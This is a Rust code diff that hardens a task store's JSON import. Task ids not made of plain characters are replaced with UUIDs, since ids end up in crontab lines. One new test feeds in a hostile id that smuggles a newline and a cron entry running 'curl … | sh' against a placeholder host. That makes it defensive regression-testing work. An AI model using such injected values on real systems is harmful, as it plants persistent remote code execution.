@@ -435,7 +435,10 @@ impl TaskStore {
             let mut map: HashMap<String, String> = HashMap::new();
             let mut ids: Vec<String> = Vec::with_capacity(tasks.len());
             for t in &tasks {
-                let new_id = if t.id.trim().is_empty() || used.contains(&t.id) { uuid::Uuid::new_v4().to_string() } else { t.id.clone() };
+                // Ids go into OS scheduler entries (a crontab line, a launchd label): one of
+                // a file someone sent is kept only when plain (no newline adding a cron line).
+                let plain = t.id.len() <= 64 && t.id.chars().all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_');
+                let new_id = if !plain || used.contains(&t.id) { uuid::Uuid::new_v4().to_string() } else { t.id.clone() };
                 used.insert(new_id.clone());
                 map.entry(t.id.clone()).or_insert_with(|| new_id.clone());
                 ids.push(new_id);
@@ -616,6 +619,22 @@ mod tests {
         // A plain array with an explicitly enabled scheduled task too.
         let arr = serde_json::to_string(&vec![shell("x").with_schedule(every)]).unwrap();
         assert!(!store.import_json(&arr).unwrap()[0].enabled);
+    }
+
+    /// An imported id that is not plain is replaced: it goes into a crontab line, and a
+    /// line break in it added a cron entry of the file's.
+    #[test]
+    fn imported_ids_that_are_not_plain_are_replaced() {
+        let dir = tempfile::tempdir().unwrap();
+        let store = TaskStore::open(dir.path()).unwrap();
+        let mut evil = shell("x");
+        evil.id = "x\n* * * * * curl e/x|sh #".into();
+        let mut plain = shell("y");
+        plain.id = "nightly-backup_1".into();
+        let arr = serde_json::to_string(&vec![evil, plain]).unwrap();
+        let imported = store.import_json(&arr).unwrap();
+        assert!(imported[0].id.chars().all(|c| c.is_ascii_hexdigit() || c == '-'), "{:?}", imported[0].id);
+        assert_eq!(imported[1].id, "nightly-backup_1");
     }
 
     #[cfg(unix)]
